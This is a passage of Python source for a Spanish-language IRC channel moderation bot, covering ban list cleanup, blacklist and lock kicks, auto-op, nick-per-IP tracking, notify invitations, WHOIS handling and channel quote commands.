        old_lower = nm.nick.lower()
        new_lower = nuevo.lower()
        for grupo in self._ops.values():
            if old_lower in grupo:
                grupo.discard(old_lower)
                grupo.add(new_lower)
        for grupo in self._members.values():
            if old_lower in grupo:
                grupo.discard(old_lower)
                grupo.add(new_lower)
        if nm.host:
            self.nicklogger.registrar(nm.host, nuevo)
            
        # Seen: Registrar cambio de nick
        self.seen.registrar(nm.nick, "IRC", f"{nm.nick}!{nm.user}@{nm.host}", "NICK", nuevo)
        
        self._bl_nick_check(nuevo, nm.host or "")

    def _evt_pubmsg(self, _: ServerConn, event: IRCEvent) -> None:
        nm    = irc.client.NickMask(event.source)
        texto = strip_mirc_colors(event.arguments[0] if event.arguments else "")
        # Cache del host en tiempo real para ban+kick
        nick_lower = nm.nick.lower()
        host_part = nm.host or ""
        if host_part:
            self._recent_hosts[nick_lower] = host_part
        self._on_msg_canal(nm.nick, f"{nm.nick}!{nm.user}@{nm.host}", event.target, texto)

    def _evt_privmsg(self, _: ServerConn, event: IRCEvent) -> None:
        nm    = irc.client.NickMask(event.source)
        texto = strip_mirc_colors(event.arguments[0] if event.arguments else "")

        self._on_msg_privado(nm.nick, f"{nm.nick}!{nm.user}@{nm.host}", texto)

    def _evt_banlist(self, _: ServerConn, event: IRCEvent) -> None:
        """Raw 367 — una entrada de la lista de bans: [canal, mask, quien, timestamp]."""
        if len(event.arguments) < 2:
            return
        canal = event.arguments[0].lower()
        mask  = event.arguments[1]
        try:
            ts = float(event.arguments[3]) if len(event.arguments) >= 4 else 0.0
        except (ValueError, IndexError):
            ts = 0.0
        quien = event.arguments[2] if len(event.arguments) >= 3 else "desconocido"
        self._banlist_tmp.setdefault(canal, []).append((mask, ts, quien))

    def _evt_endofbanlist(self, _: ServerConn, event: IRCEvent) -> None:
        """Raw 368 — fin de lista de bans. Procesa candidatos excluyendo la IBL."""
        if not event.arguments:
            return
        canal = event.arguments[0].lower()
        lista = self._banlist_tmp.pop(canal, [])
        
        # --- Lógica !infoban ---
        for n_low, (c_ped, p_ped) in list(self._infoban_req.items()):
            h_recent = self._recent_hosts.get(n_low, "")
            found_ban = None
            for item in lista:
                b_mask, b_ts, *extra = item
                b_who = extra[0] if extra else "desconocido"
                if n_low in b_mask.lower() or (h_recent and h_recent.lower() in b_mask.lower()):
                    found_ban = (b_mask, b_ts, b_who)
                    break
            
            if found_ban:
                m, t, w = found_ban
                fecha_str = datetime.fromtimestamp(t).strftime('%H:%M:%S del %d/%m/%Y')
                nick_w = w.split('!')[0] if '!' in w else w
                self._notify_telegram(f"🔍 <b>InfoBan:</b> {p_ped} consultó a {n_low}")
                self.pm(c_ped, f"\x033[InfoBan]\x03 El usuario \x0312{n_low}\x03 está baneado en \x033{self.cfg.canal_principal}\x03 con la máscara \x0312{m}\x03. Puesto por \x034{nick_w}\x03 a las \x0312{fecha_str}\x03.")
            else:
                self.pm(c_ped, f"\x034[InfoBan]\x03 No se encontró ningún ban activo para \x0312{n_low}\x03 en \x033{self.cfg.canal_principal}\x03.")
            self._infoban_req.pop(n_low)

        if not lista:
            self._limpiabans_programar(canal)
            return

        manual = self._limpiando_bans.get(canal, False)
        ahora  = time.time()
        umbral = self.cfg.limpiabans_umbral
        ibl    = {mask.lower() for mask in self.db.ibl_listar(canal)}

        # Filtro inteligente (antigüedad > 6h e IBL protegido)
        candidatos = []
        for item in lista:
            mask, ts, *extra = item
            if ts > 0 and (ahora - ts) >= umbral and mask.lower() not in ibl:
                if not any(fnmatch.fnmatch(mask.lower(), ibl_mask) for ibl_mask in ibl):
                    candidatos.append(mask)

        if manual:
            self._limpiando_bans[canal] = False
            self.pm(self.cfg.canal_ops, f"\x033[Limpieza Manual]\x03 Procesando {canal}. Eliminando \x0312{len(candidatos)}\x03 bans que superan las {umbral // 3600}h.")

        if not candidatos:
            self._limpiabans_programar(canal)
            return

        for i in range(0, len(candidatos), 4):
            lote = candidatos[i:i + 4]
            self.modo(canal, f"-{'b' * len(lote)}", *lote)
            time.sleep(0.3)

        if not manual:
            self.debug(f"\x033[LIMPIABANS]\x03 \x033{canal}\x03: \x0312{len(candidatos)}\x03 bans eliminados.")
        self._limpiabans_programar(canal)

    def _evt_topic(self, _: ServerConn, event: IRCEvent) -> None:
        """Evento TOPIC — alguien cambia el topic de un canal."""
        canal      = event.target
        nm         = irc.client.NickMask(event.source)
        nuevo_topic = event.arguments[0] if event.arguments else ""

        # Si el bot mismo cambió el topic (restauración), ignorar para no buclar
        if nm.nick.lower() == self.cfg.nick.lower():
            return

        if not self.gestor_topiclock.esta_activo(canal):
            return

        topic_guardado = self.gestor_topiclock.topic_guardado(canal)
        if nuevo_topic == topic_guardado:
            return

        # Topic no autorizado → restaurar
        if self._conn and self.es_op(canal, self.cfg.nick):
            self._conn.topic(canal, topic_guardado)
            self.debug(
                f"\x034[TOPICLOCK]\x03 \x0312{nm.nick}\x03 intento cambiar el topic en "
                f"\x033{canal}\x03 — restaurado."
            )

    _JOIN_ERROR_NOMBRES: Dict[str, str] = {
        "bannedfromchan": "baneado (474)",
        "inviteonlychan": "solo invitados (473)",
        "badchannelkey":  "clave incorrecta (475)",
        "needreggednick": "nick no registrado (477)",
        "channelisfull":  "canal lleno (471)",
    }
    _JOIN_RETRY_SEG = 120  # reintento cada 2 minutos

    def _evt_join_error(self, _: ServerConn, event: IRCEvent) -> None:
        canal = event.arguments[0] if event.arguments else ""
        if not canal:
            return
        nombre = self._JOIN_ERROR_NOMBRES.get(event.type, event.type)
        self.debug(
            f"\x034[JOIN-ERROR]\x03 No pude entrar en \x033{canal}\x03 — "
            f"\x034{nombre}\x03. Reintentando en {self._JOIN_RETRY_SEG}s..."
        )
        self.log.warning("Join fallido en %s (%s). Reintentando en %ds.", canal, nombre, self._JOIN_RETRY_SEG)
        # Si estoy baneado, pedir a CHaN que me quite el ban antes de reintentar
        if event.type == "bannedfromchan" and self._conn:
            self._conn.privmsg("CHaN", f"UNBAN {canal} {self.cfg.nick}")
            self.debug(f"\x034[JOIN-ERROR]\x03 Solicitado \x0312UNBAN {canal} {self.cfg.nick}\x03 a CHaN.")
        self._join_programar_reintento(canal)

    def _join_programar_reintento(self, canal: str) -> None:
        canal_lower = canal.lower()
        timer_anterior = self._join_retry_timers.pop(canal_lower, None)
        if timer_anterior:
            timer_anterior.cancel()
        t = threading.Timer(self._JOIN_RETRY_SEG, self._join_reintentar, args=[canal])
        t.daemon = True
        t.start()
        self._join_retry_timers[canal_lower] = t

    def _join_reintentar(self, canal: str) -> None:
        self._join_retry_timers.pop(canal.lower(), None)
        if self._conn:
            self.log.info("Reintentando join en %s...", canal)
            self._conn.join(canal)

    # Tracking de MODE

    def _on_mode(self, canal: str, modos: str, tgts: List[str], quien: str = "") -> None:
        self._ops.setdefault(canal, set())
        adding = True
        idx    = 0
        for ch in modos:
            if   ch == '+': adding = True
            elif ch == '-': adding = False
            elif ch == 'o' and idx < len(tgts):
                nick_lower = tgts[idx].lower()
                idx += 1
                self._ops[canal].add(nick_lower) if adding else self._ops[canal].discard(nick_lower)
                # El bot acaba de recibir @ → iniciar ciclo de limpiabans
                if adding and nick_lower == self.cfg.nick.lower():
                    threading.Timer(5.0, self._limpiabans_iniciar, args=[canal]).start()
            elif ch == 'b' and idx < len(tgts):
                mask = tgts[idx]
                idx += 1
                if adding:
                    self._rango_on_ban(canal, mask)
                else:
                    self._ibl_on_unban(canal, mask, quien)
                    self.rango.on_unban(canal, mask)

    # Rejoin tras kick

    def _on_kick(self, canal: str, kicked: str, quien: str) -> None:
        # Seen: Registrar expulsion
        host = self._recent_hosts.get(kicked.lower(), f"{kicked}!*@*")
        self.seen.registrar(kicked, canal, host, "KICK", quien)

        if kicked.lower() == self.cfg.nick.lower():
            self.log.info("Kickeado de %s por %s. Volviendo en 3s...", canal, quien)
            threading.Timer(3.0, lambda: self._conn and self._conn.join(canal)).start()

    def _on_banlist(self, _: ServerConn, event: IRCEvent) -> None:
        """RPL_BANLIST (367): Recibimos una máscara de ban."""
        canal = event.arguments[0].lower()
        mask  = event.arguments[1]
        
        if self._limpiando_bans.get(canal):
            # Quitar el ban inmediatamente
            self.modo(canal, "-b", mask)

    def _on_endofbanlist(self, _: ServerConn, event: IRCEvent) -> None:
        """RPL_ENDOFBANLIST (368): Fin de la lista de bans."""
        canal = event.arguments[0].lower()
        if self._limpiando_bans.get(canal):
            self.pm(canal, f"\x033OK\x03 Limpieza de bans en {canal} finalizada.")
            self._limpiando_bans[canal] = False

    # JOIN

    def _on_join(self, nick: str, hostmask: str, canal: str) -> None:
        # Guardián de lock: tiene prioridad sobre todo lo demás
        if self._on_join_lock(nick, hostmask, canal):
            return

        ip     = hostmask.split("@")[-1] if "@" in hostmask else hostmask
        es_bot = self.db.global_existe_mask("bots.dat", hostmask)
        exento = es_bot or self.es_staff(nick, hostmask) or self.es_op(canal, nick)

        # Protección de canales privados (ops / debug)
        canales_privados = {c.lower() for c in [self.cfg.canal_ops, self.cfg.canal_debug] if c}
        if canal.lower() in canales_privados:
            en_wl = self.gestor_lock.en_whitelist(canal, nick)
            if not exento and not en_wl and self.es_op(canal, self.cfg.nick):
                self.modo(canal, "+b", f"*!*@{ip}")
                self.kick(canal, nick, "Lo sentimos, pero no tienes acceso para entrar en este canal.")
                threading.Timer(300, lambda: self.modo(canal, "-b", f"*!*@{ip}")).start()
            elif (exento or en_wl) and self.es_op(canal, self.cfg.nick):
                self.modo(canal, "+v", nick)
                # Bienvenida al staff cuando entra en el canal de ops
                rol = self._rol(nick, hostmask)
                if rol and not es_bot:
                    _NOMBRE_ROL = {"root": "Root", "admin": "Admin", "mod": "Moderador"}
                    self.pm(canal,
                        f"Bienvenido/a \x0312{nick}\x03, "
                        f"eres reconocido/a como \x034{_NOMBRE_ROL[rol]}\x03. "
                        f"Para saber mis comandos escribe \x0312!help\x03 aquí mismo."
                    )
            return
        
        self._buscar_pendientes(nick)

        # ✅ Registro SIEMPRE primero — incluso si el usuario está en BL,
        # así la próxima vez que entre con otra IP/nick queda en el historial.
        es_nuevo = self.nicklogger.registrar(ip, nick)
        self.aka.registrar(ip, nick)

        bl = self.blista.obtener(canal, nick)
        if bl and not exento:
            if self.es_op(canal, self.cfg.nick):
                self.modo(canal, "+b", f"*!*@{ip}")
                self.kick(canal, nick, bl["motivo"])
                self.pm(self.cfg.canal_ops,
                    f"\x034[BL]\x03 \x0312{nick}\x03 expulsado de \x033{canal}\x03 "
                    f"(por \x0312{bl['por']}\x03): {bl['motivo']}")
            if not bl.get("host"):
                self._whois_bl[nick.lower()] = (canal, bl["motivo"], bl["por"])
                if self._conn:
                    self._conn.whois([nick])
            return

        if not exento:
            todos = self.nicklogger.nicks_de(ip)
            # Debug AKA: siempre que la IP tenga nicks anteriores, nick nuevo o no
            if len(todos) > 1:
                otros = [n for n in todos if n.lower() != nick.lower()]
                if otros:
                    self.debug(
                        f"\x033[AKA]\x03 \x0312{nick}\x03 en \x033{canal}\x03 "
                        f"— Nicks anteriores: \x0312{', '.join(otros)}\x03 "
                        f"| Total: \x0312{len(todos)}\x03"
                    )

            for ban_mask in self.db.ibl_listar(canal):
                host_ban = ban_mask.split("@")[-1] if "@" in ban_mask else ""
                if host_ban and self.aka.ip_coincide_con_host(host_ban) == ip:
                    if self.es_op(canal, self.cfg.nick):
                        self.modo(canal, "+b", f"*!*@{ip}")
                        self.kick(canal, nick, "Su acceso a este canal no esta permitido.")
                        self.debug(f"\x034[IBL+AKA]\x03 Evasor \x0312{nick}\x03 en \x033{canal}\x03 "
                                   f"cubierto por \x0312{ban_mask}\x03")
                    return

        # 3. Auto-OP / Auto-Voice
        # Prioridad 1: Staff (Moderadores, Admins y Roots) recibe OP automático.
        # EXCEPCIÓN ESTRICTA: El Usuario JuanJo_Jaen NUNCA recibe OP por ser Staff.
        # Solo lo recibirá si está en la lista manual de !aop o usa !op.
        is_juanjo = nick.lower() == "juanjo_jaen" or "JuanJo_Jaen!" in hostmask
        
        if self.es_staff(nick, hostmask) and not is_juanjo and not self.db.adown_check(canal, nick) and self.es_op(canal, self.cfg.nick):
            self.modo(canal, "+o", nick)
        # Prioridad 2: Listas de AutoOP manuales (Aquí sí entraría JuanJo si se añade con !aop add)
        # Si el usuario está en adown, NO recibe auto-op aunque esté en la lista de !aop
        elif self.db.autoop_check(canal, hostmask) and not self.db.adown_check(canal, nick) and self.es_op(canal, self.cfg.nick):
            self.modo(canal, "+o", nick)

        if self.db.avoice_check(canal, hostmask) and self.es_op(canal, self.cfg.nick):
            self.modo(canal, "+v", nick)

        if (not exento and not self.es_op(canal, nick)
                and self.db.get_proteccion(canal, "Nicks")
                and not self.db.nick_excepcion(canal, nick)
                and self.db.nick_prohibido(canal, nick)):
            self.modo(canal, "+b", f"*!*@{ip}")
            self.kick(canal, nick, "Su nick no es adecuado para la tematica del canal, por favor cambielo y vuelva a entrar.")
            self.debug(f"\x034[NICK]\x03 Expulsado \x0312{nick}\x03 de \x033{canal}\x03")

    # Guardián de lock en JOIN

    def _on_join_lock(self, nick: str, hostmask: str, canal: str) -> bool:
        """
        Si el canal está bloqueado y el nick no tiene acceso → kick + ban temporal.
        Devuelve True si se aplicó la restricción.
        """
        if not self.gestor_lock.esta_bloqueado(canal):
            return False
        if self.db.global_existe_mask("bots.dat", hostmask):
            return False
        if self.es_staff(nick, hostmask):
            return False
        if self.gestor_lock.en_whitelist(canal, nick):
            return False

        if self.es_op(canal, self.cfg.nick):
            ip = hostmask.split("@")[-1] if "@" in hostmask else hostmask
            self.modo(canal, "+b", f"*!*@{ip}")
            self.kick(canal, nick, "Canal restringido. Contacta con un Moderador.")
            threading.Timer(300, lambda: self.modo(canal, "-b", f"*!*@{ip}")).start()
            self.debug(f"\x034[LOCK]\x03 \x0312{nick}\x03 bloqueado en \x033{canal}\x03")
        return True

    def _bl_nick_check(self, nick: str, ip: str) -> None:
        for canal in list(self._ops.keys()):
            bl = self.blista.obtener(canal, nick)
            if bl and self.es_op(canal, self.cfg.nick):
                self.modo(canal, "+b", f"*!*@{ip}")
                self.kick(canal, nick, bl["motivo"])
                self.pm(self.cfg.canal_ops,
                    f"\x034[BL]\x03 \x0312{nick}\x03 (cambio de nick) expulsado de \x033{canal}\x03 "
                    f"(por \x0312{bl['por']}\x03): {bl['motivo']}")

    # Rango

    def _rango_on_ban(self, canal: str, mask: str) -> None:
        if not self.db.global_existe("rango.dat", canal):
            return
        ban_mask = self.rango.on_ban(canal, mask)
        if ban_mask and self.es_op(canal, self.cfg.nick):
            self.modo(canal, "+b", ban_mask)
            self.debug(f"\x034[RANGO]\x03 Autoban en \x033{canal}\x03: \x0312{ban_mask}\x03 "
                       f"({self.cfg.rango_threshold}+ bans)")
            threading.Timer(self.cfg.rango_duracion, self._rango_quitar_ban, args=[canal, ban_mask]).start()

    def _rango_quitar_ban(self, canal: str, mask: str) -> None:
        if self.es_op(canal, self.cfg.nick):
            self.modo(canal, "-b", mask)

    # IBL

    def _ibl_on_unban(self, canal: str, mask: str, quien: str) -> None:
        if quien.lower() == self.cfg.nick.lower() or not self.db.ibl_existe(canal, mask):
            return
        if not self.es_op(canal, self.cfg.nick):
            return
        self.modo(canal, "+b", mask)
        self.debug(f"\x034[IBL]\x03 Ban restaurado en \x033{canal}\x03: \x0312{mask}\x03 (por \x034{quien}\x03)")

    def _ibl_revisar_canal(self, canal: str) -> None:
        if not self.es_op(canal, self.cfg.nick):
            self.debug(f"\x034[IBL]\x03 Sin @ en \x033{canal}\x03, bans IBL no aplicados.")
            return
        bans = self.db.ibl_listar(canal)
        for i in range(0, len(bans), 4):
            lote = bans[i:i + 4]
            self.modo(canal, f"+{'b' * len(lote)}", *lote)
            time.sleep(0.3)
        if bans:
            self.debug(f"\x034[IBL]\x03 \x0312{len(bans)}\x03 bans verificados en \x033{canal}\x03")
        self._bl_revisar_canal(canal)

    def _bl_revisar_canal(self, canal: str) -> None:
        if not self.es_op(canal, self.cfg.nick):
            return
        masks = [f"*!*@{e['host']}" for e in self.blista.listar(canal) if e.get("host")]
        if not masks:
            return
        for i in range(0, len(masks), 4):
            lote = masks[i:i + 4]
            self.modo(canal, f"+{'b' * len(lote)}", *lote)
            time.sleep(0.3)
        self.debug(f"\x034[BL]\x03 \x0312{len(masks)}\x03 bans verificados en \x033{canal}\x03")

    # LimpiaBans

    def _limpiabans_iniciar(self, canal: str) -> None:
        es_pral = canal.lower() == self.cfg.canal_principal.lower()
        if not es_pral and not self.db.global_existe("canales.dat", canal):
            return
        if not self.es_op(canal, self.cfg.nick):
            return
        self._banlist_tmp[canal.lower()] = []
        if self._conn:
            self._conn.mode(canal, "+b")

    def _limpiabans_programar(self, canal: str) -> None:
        """Cancela el timer anterior (si existe) y programa el siguiente ciclo."""
        canal_lower = canal.lower()
        timer_anterior = self._limpiabans_timers.pop(canal_lower, None)
        if timer_anterior:
            timer_anterior.cancel()
        nuevo_timer = threading.Timer(
            self.cfg.limpiabans_intervalo,
            self._limpiabans_iniciar,
            args=[canal],
        )
        nuevo_timer.daemon = True
        nuevo_timer.start()
        self._limpiabans_timers[canal_lower] = nuevo_timer

    # Bienvenida
    def _on_welcome(self) -> None:
        def _secuencia() -> None:
            time.sleep(2)
            self._autenticar()
            time.sleep(1)
            if self.cfg.user_modes and self._conn:
                self._conn.send_raw(f"MODE {self.cfg.nick} {self.cfg.user_modes}")
            time.sleep(2)
            canales_fijos: Set[str] = set()
            for canal in [self.cfg.canal_debug, self.cfg.canal_ops, self.cfg.canal_principal]:
                if canal and self._conn:
                    self._conn.join(canal)
                    canales_fijos.add(canal.lower())
                    time.sleep(0.5)
            for canal in self.db.global_listar("canales.dat"):
                if canal.lower() not in canales_fijos and self._conn:
                    self._conn.join(canal)
                    time.sleep(0.5)
            # Arrancar ciclo de notify (pasamos la generación actual para evitar fugas de timer)
            gen = self._notify_gen
            t = threading.Timer(10.0, self._notify_ciclo, args=[gen])
            t.daemon = True
            t.start()
        threading.Thread(target=_secuencia, daemon=True).start()

    # WHOIS

    def _notify_ciclo(self, gen: int = 0) -> None:
        """Envía ISON con todos los nicks vigilados y reprograma el siguiente ciclo.
        El parámetro gen identifica la cadena de timers actual; si no coincide con
        self._notify_gen la cadena pertenece a una conexión anterior y se descarta.
        """
        if gen != self._notify_gen:
            return  # timer huérfano de una conexión anterior — detener cadena
        nicks = self.gestor_notify.listar()
        if nicks and self._conn:
            try:
                self._conn.send_raw(f"ISON {' '.join(nicks)}")
            except Exception:
                pass
        t = threading.Timer(GestorNotify.INTERVALO, self._notify_ciclo, args=[gen])
        t.daemon = True
        t.start()

    def _evt_ison(self, _: ServerConn, event: IRCEvent) -> None:
        """Raw 303 — respuesta ISON: lista de nicks online separados por espacios."""
        respuesta = event.arguments[0] if event.arguments else ""
        nicks_online = {n.lower(): n for n in respuesta.split() if n}
        
        for nick_vigu in self.gestor_notify.listar():
            nk = nick_vigu.lower()
            online = nk in nicks_online
            actual_nick = nicks_online[nk] if online else nick_vigu
            
            anterior = self.gestor_notify.actualizar_estado(nk, online)
            
            # 1. Notificar cambio de estado (si no es la primera vez)
            if anterior is not None and anterior != online:
                if online:
                    self.pm(self.cfg.canal_ops, f"\x033***\x03 \x0312{actual_nick}\x03 se ha conectado a la red")
                else:
                    self.pm(self.cfg.canal_ops, f"\x034***\x03 \x0312{actual_nick}\x03 se ha desconectado de la red")
            
            # 2. Si está online, verificar si hay que invitar (independientemente de si acaba de conectar)
            if online:
                canal_ops_lower = self.cfg.canal_ops.lower()
                miembros_ops = self._members.get(canal_ops_lower, set())
                
                if nk not in miembros_ops:
                    # No está en el canal de OPS, invitar (con cooldown de 1h para evitar spam)
                    ahora = time.time()
                    ultimo = self._last_invite_notify.get(nk, 0)
                    if ahora - ultimo > 3600:
                        if self._conn:
                            self.log.info(f"Invitando a {actual_nick} a {self.cfg.canal_ops} (ISON detect)")
                            self.pm(self.cfg.canal_ops, f"\x033[NOTIFY]\x03 Enviando invitación a \x0312{actual_nick}\x03 para entrar en \x0312{self.cfg.canal_ops}\x03")
                            self._conn.invite(actual_nick, self.cfg.canal_ops)
                            self._last_invite_notify[nk] = ahora

    def _verificar_entrada_notify(self, nick_obj: str, canal_respuesta: str) -> None:
        """Verifica si un nick entró al canal después de ser invitado y le envía un mensaje cordial si no."""
        canal_ops_lower = self.cfg.canal_ops.lower()
        miembros_en_canal = self._members.get(canal_ops_lower, set())
        nick_obj_lower = nick_obj.lower()
        
        if nick_obj_lower in miembros_en_canal:
            self.pm(canal_respuesta, f"\x033[NOTIFY]\x03 \x0312{nick_obj}\x03 ha aceptado la invitación y está en \x0312{self.cfg.canal_ops}\x03")
        else:
            # El nick no entró, enviar mensaje privado cordial
            self.pm(canal_respuesta, f"\x034[NOTIFY]\x03 \x0312{nick_obj}\x03 no ha aceptado la invitación, enviando mensaje privado...")
            mensaje = (
                f"\x033Hola \x0312{nick_obj}\x03! \x031Te ha sido enviada una invitación al canal \x0312{self.cfg.canal_ops}\x03 "
                f"(canal de moderadores) porque has sido añadido a la lista de vigilancia del bot.\x03 "
                f"\x031Para aceptar, simplemente haz clic en la invitación o escribe \x0312/JOIN {self.cfg.canal_ops}\x03. "
                f"¡Te esperamos!\x03"
            )
            if self._conn:
                self._conn.send_raw(f"PRIVMSG {nick_obj} :{mensaje}")

    def _on_notify_online(self, nick: str, host: str, canal_respuesta: str, contexto: str) -> None:
        """El nick está online. Verificar canal principal y canal OPS, invitar si corresponde."""
        canal_ops_lower = self.cfg.canal_ops.lower()
        canal_principal_lower = self.cfg.canal_principal.lower()
        nick_lower = nick.lower()

        miembros_principal = self._members.get(canal_principal_lower, set())
        miembros_ops = self._members.get(canal_ops_lower, set())

        en_principal = nick_lower in miembros_principal
        en_ops = nick_lower in miembros_ops

        if en_principal and en_ops:
            # Está en ambos canales, no hacer nada más
            self.pm(canal_respuesta, f"\x033[NOTIFY]\x03 \x0312{nick}\x03 ya está en \x0312{self.cfg.canal_ops}\x03. Todo correcto.")
            return

        if not en_principal:
            # No está en el canal principal, invitar
            if self._conn:
                self.pm(canal_respuesta, f"\x033[NOTIFY]\x03 \x0312{nick}\x03 no está en \x0312{self.cfg.canal_principal}\x03, enviando invitación...")
                self._conn.send_raw(f"INVITE {nick} {self.cfg.canal_principal}")

        if not en_ops:
            # No está en el canal OPS, invitar
            if self._conn:
                self.pm(canal_respuesta, f"\x033[NOTIFY]\x03 \x0312{nick}\x03 no está en \x0312{self.cfg.canal_ops}\x03, enviando invitación...")
                self._conn.send_raw(f"INVITE {nick} {self.cfg.canal_ops}")
                # Verificar si entra tras unos segundos
                threading.Timer(3.0, self._verificar_entrada_notify, args=[nick, canal_respuesta]).start()

    def _on_notify_offline(self, nick: str, canal_respuesta: str) -> None:
        """El nick no está conectado. Informar y detener el proceso."""
        self.pm(canal_respuesta, f"\x034[NOTIFY]\x03 \x0312{nick}\x03 no está conectado. Añadido a la lista pero no se enviará invitación.")

    def _on_whois_311(self, nick: str, host: str) -> None:
        nk = nick.lower()
        if nk in self._infoban_req:
            self._recent_hosts[nk] = host
            if self._conn:
                self._conn.mode(self.cfg.canal_principal, "b")
            return
        if nk in self._whois_sancion:
            canal, tipo, motivo, por, trigger = self._whois_sancion.pop(nk)
            self.modo(canal, "+b", f"*!*@{host}")
            self.kick(canal, nick, self._razon(tipo, motivo, trigger))
            por_txt     = f" por \x0312{por}\x03" if por else ""
            trigger_txt = f" — dijo: '\x0312{trigger}\x03'" if trigger else ""
            self.pm(self.cfg.canal_ops,
                f"\x034[SANCION]\x03 \x0312{nick}\x03 "
                f"expulsado de \x033{canal}\x03{por_txt} — motivo: \x0312{self._razon(tipo, motivo, trigger)}\x03"
                f"{trigger_txt}")
            return

        if nk in self._whois_add:
            fichero, solicitante, nombre = self._whois_add.pop(nk)
            mascara = f"{nick.lower()}!*@{host.lower()}"
            if self.db.global_agregar(fichero, mascara):
                self.pm(solicitante,
                    f"Estupendo! \x0312{nick}\x03 añadido como {nombre} con mascara \x0312{mascara}\x03")
                self.debug(f"Admin \x034{solicitante}\x03 añadio {nombre} \x0312{mascara}\x03")
            else:
                self.pm(solicitante, f"Error: Ya existe una entrada para \x0312{nick}\x03.")
            return

        if nk in self._whois_upgrade:
            ficheros = self._whois_upgrade.pop(nk)
            mascara  = f"{nick.lower()}!*@{host.lower()}"
            for fichero in ficheros:
                self.db.global_eliminar(fichero, nick)
                self.db.global_agregar(fichero, mascara)
            self.debug(f"\x034[AUTO]\x03 \x0312{nick}\x03 -> \x0312{mascara}\x03 en: {', '.join(ficheros)}")
            return

        if nk in self._whois_bl:
            canal, motivo, por = self._whois_bl.pop(nk)
            self.blista.actualizar_host(canal, nick, host)
            if self.es_op(canal, self.cfg.nick):
                self.modo(canal, "+b", f"*!*@{host}")
                self.kick(canal, nick, motivo)
                self.pm(self.cfg.canal_ops,
                    f"\x034[BL]\x03 \x0312{nick}\x03 expulsado de \x033{canal}\x03 (por \x0312{por}\x03): {motivo}")
            return

        if nk in self._whois_unban:
            canal, por = self._whois_unban.pop(nk)
            mask = f"*!*@{host}"
            if self.es_op(canal, self.cfg.nick):
                self.modo(canal, "-b", mask)
                self.pm(self.cfg.canal_ops,
                    f"\x033[UNBAN]\x03 \x0312{nick}\x03 desbaneado en \x033{canal}\x03 "
                    f"por \x0312{por}\x03")

        if nk in self._whois_notify:
            canal_respuesta, contexto = self._whois_notify.pop(nk)
            self._on_notify_online(nick, host, canal_respuesta, contexto)

    def _on_whois_401(self, nick: str) -> None:
        nk = nick.lower()
        if nk in self._infoban_req:
            if self._conn:
                self._conn.mode(self.cfg.canal_principal, "b")
            return
        if nk in self._whois_add:
            fichero, solicitante, _ = self._whois_add.pop(nk)
            if self.db.global_agregar(fichero, nick):
                self.pm(solicitante,
                    f"\x0312{nick}\x03 no esta conectado. Guardado como pendiente — "
                    f"se resolvera su host cuando entre.")
            else:
                self.pm(solicitante, f"\x0312{nick}\x03 ya existe en la lista.")
        if nk in self._whois_bl:
            self._whois_bl.pop(nk)
            self.pm(self.cfg.canal_ops,
                f"\x034[BL]\x03 \x0312{nick}\x03 no esta conectado. "
                f"Guardado como pendiente — se expulsara y se tomara el host cuando entre.")
        if nk in self._whois_unban:
            self._whois_unban.pop(nk)
            self.pm(self.cfg.canal_ops,
                f"\x034[UNBAN]\x03 \x0312{nick}\x03 no esta conectado — no se puede obtener el host.")
        if nk in self._whois_notify:
            canal_respuesta, _ = self._whois_notify.pop(nk)
            self._on_notify_offline(nick, canal_respuesta)

    def _buscar_pendientes(self, nick: str) -> None:
        pendientes = [
            fichero for fichero in self._FICHEROS_STAFF
            if any("!" not in entrada and entrada.lower() == nick.lower()
                   for entrada in self.db.global_listar(fichero))
        ]
        nk2 = nick.lower()
        if pendientes and nk2 not in self._whois_upgrade:
            self._whois_upgrade[nk2] = pendientes
            if self._conn:
                self._conn.whois([nick])

    # Protecciones

    def _razon(self, tipo: str, motivo: str = "", trigger: str = "") -> str:
        if tipo == "propio" and motivo:
            return motivo
        if tipo == "frase" and trigger:
            return f"Temática no permitida en el canal ({trigger}). Si se trata de un error acuda a un moderador (@)"
        return self._RAZONES.get(tipo, "Incumplimiento de las normas del canal.")

    def _sancionar(self, nick: str, canal: str, tipo: str, motivo: str = "", por: str = "", trigger: str = "") -> None:
        if not self.es_op(canal, nick):
            self._whois_sancion[nick.lower()] = (canal, tipo, motivo, por, trigger)
            if self._conn:
                self._conn.whois([nick])

    def _on_msg_canal(self, nick: str, hostmask: str, canal: str, texto: str) -> None:
        # Seen: Registrar actividad de texto
        self.seen.registrar(nick, canal, hostmask, "TEXT")

        # --- YouTube Parser ---
        yt_regex = r"(?:https?://)?(?:www\.)?(?:youtube\.com/(?:watch\?v=|shorts/)|youtu\.be/)([a-zA-Z0-9_-]{11})"
        yt_match = re.search(yt_regex, texto)
        if yt_match:
            video_id = yt_match.group(1)
            url = f"https://www.youtube.com/watch?v={video_id}"
            def _yt_worker():
                info = self.yt.get_info(url)
                if info:
                    self.pm(canal, info)
            threading.Thread(target=_yt_worker, daemon=True).start()

        partes = texto.strip().split()
        cmd    = partes[0].lower() if partes else ""
        args   = partes[1:]

        # --- Comandos de Citas (Guardian Style) ---
        if cmd == "!quoteadd":
            if not args:
                self.pm(canal, "\x034Error:\x03 Uso: !quoteadd <cita>")
            elif not self.es_staff(nick, hostmask) and not self.es_op(canal, nick):
                self.pm(canal, "\x034Error:\x03 Solo el staff puede añadir citas.")
            else:
                q_text = " ".join(args)
                new_id = self.quotes.add(canal, nick, q_text)
                self.pm(canal, f"\x033[QUOTE]\x03 Cita #{new_id} añadida correctamente.")
            return
        elif cmd == "!quotedel":
            if not args or not args[0].isdigit():
                self.pm(canal, "\x034Error:\x03 Uso: !quotedel <id>")
            elif not self.es_staff(nick, hostmask):
                self.pm(canal, "\x034Error:\x03 Solo el staff puede eliminar citas.")
            else:
                if self.quotes.del_quote(canal, int(args[0])):
                    self.pm(canal, f"\x033[QUOTE]\x03 Cita #{args[0]} eliminada.")
                else:
                    self.pm(canal, f"\x034Error:\x03 La cita #{args[0]} no existe.")
            return
        elif cmd == "!quote":
            qid = int(args[0]) if args and args[0].isdigit() else None
            q = self.quotes.get(canal, qid)
            if q:
                from datetime import datetime
                fecha = datetime.fromtimestamp(q['time']).strftime('%d/%m/%Y')
                self.pm(canal, f"\x0310[Cita #{q['id']}]\x03 \x02“\x02{q['text']}\x02”\x02 — Por \x0312{q['nick']}\x03 el \x0315{fecha}\x03")
            else:
                self.pm(canal, "\x034Error:\x03 No hay citas para este canal" + (f" con ID #{qid}" if qid else "."))
            return

        es_staff    = self.es_staff(nick, hostmask)
        canales_ops = {self.cfg.canal_ops.lower(), self.cfg.canal_debug.lower()} - {""}

        if canal.lower() in canales_ops and es_staff:
